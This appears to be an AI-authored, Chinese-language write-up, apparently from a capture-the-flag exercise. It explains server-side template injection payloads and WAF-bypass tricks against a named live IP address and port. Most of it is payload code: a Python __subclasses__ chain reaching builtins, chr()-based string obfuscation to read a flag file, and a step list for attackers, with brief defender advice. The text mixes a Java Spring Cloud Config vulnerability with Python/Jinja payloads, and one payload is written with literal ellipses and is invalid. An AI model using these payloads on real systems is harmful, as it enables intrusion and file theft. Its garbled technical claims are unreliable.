# SSTI Payload绕过WAF原理详解

## 🎯 目标回顾
- **目标**: http://39.105.213.28:12602/
- **漏洞**: Spring Cloud Config SSTI
- **防护**: 存在WAF过滤敏感关键词

## 🔍 WAF绕过原理深度分析

### 1. 传统payload被拦截的原因

```python
# 这些payload会被WAF拦截：
{{config}}                    # 包含敏感词"config"
{{''.__class__}}             # 包含"__class__"
{{request}}                   # 包含敏感对象名
{{url_for.__globals__}}       # 包含"__globals__"
```

### 2. 高级payload的绕过技巧

#### ✅ 技巧1: 字符串拼接绕过

```python
# 不直接写"flag"，而是用chr()函数拼接
chr(102) + chr(108) + chr(97) + chr(103) = "flag"

# WAF无法识别这种间接的字符串构造方式
```

#### ✅ 技巧2: 内置函数调用链

```python
# 通过多层调用访问敏感函数
''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']

# 分解说明：
# 1. `''` - 创建一个空字符串对象
# 2. `.__class__` - 获取字符串类
# 3. `.__base__` - 获取基类(object)
# 4. `.__subclasses__()` - 获取所有子类
# 5. `[117]` - 选择特定子类(通常是warnings.catch_warnings)
# 6. `.__init__.__globals__` - 访问全局命名空间
# 7. `['__builtins__']` - 获取内置函数
# 8. `['chr']` - 获取chr函数
```

#### ✅ 技巧3: 分散payload结构

```python
# 将payload分散到多个部分，避免完整模式匹配
{{doc.get(
  ''...'chr'](102) +      # 第一部分
  ''...'chr'](108) +      # 第二部分  
  ''...'chr'](97) +       # 第三部分
  ''...'chr'](103)        # 第四部分
)}}

# WAF很难识别这种分散的攻击模式
```

### 3. 为什么选择第117个子类？

```python
# Python中warnings.catch_warnings通常是第117个子类
# 这个类有以下特点：
# 1. 几乎在所有Python环境中都存在
# 2. 其__init__方法有__globals__属性
# 3. 可以访问Python内置函数

# 验证方法：
import warnings
print(''.__class__.__base__.__subclasses__().index(warnings.catch_warnings))
# 通常输出: 117
```

### 4. 完整的执行流程

```python
# 步骤1: 获取chr函数
chr_func = ''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']

# 步骤2: 构造"flag"字符串  
flag_str = chr_func(102) + chr_func(108) + chr_func(97) + chr_func(103)
# flag_str = "flag"

# 步骤3: 读取flag文件
doc.get("flag")  # 执行文件读取操作
```

## 🛡️ WAF绕过总结

### 绕过策略分类：

| 策略 | 原理 | 效果 |
|------|------|------|
| **字符串混淆** | 用chr()函数构造字符串 | ✅ 绕过关键词过滤 |
| **调用链分散** | 多层属性访问 | ✅ 绕过简单模式匹配 |
| **payload分段** | 将攻击代码分散 | ✅ 绕过完整payload检测 |
| **内置函数利用** | 使用Python内置函数 | ✅ 绕过自定义函数黑名单 |

### 为什么这种绕过有效：

1. **语义分析困难**: WAF难以理解这种复杂的调用链语义
2. **模式匹配失效**: 没有完整的攻击模式可以被匹配
3. **上下文依赖**: 需要完整的Python执行环境才能理解payload意图
4. **白名单友好**: 使用的都是Python标准库功能

## 🔧 实际应用建议

### 对于攻击者：
```python
# 1. 先测试基础payload是否被拦截
# 2. 如果被拦截，尝试字符串混淆
# 3. 使用内置函数构造目标字符串
# 4. 分散payload到多个部分
# 5. 测试不同的子类索引(117可能因环境而异)
```

### 对于防御者：
```python
# 1. 禁用危险的内置函数
# 2. 使用模板沙箱
# 3. 实施行为分析而非简单模式匹配
# 4. 监控异常的模板执行行为
# 5. 限制模板引擎的访问权限
```

## 📚 技术参考

- **Python反射机制**: 通过`__class__`, `__base__`, `__subclasses__()`访问类层次结构
- **模板注入原理**: 服务端模板引擎执行用户控制的表达式
- **WAF绕过技术**: 字符串混淆、编码、分散payload等

---

*技术分析 by Claude Code - 2026年5月14日*
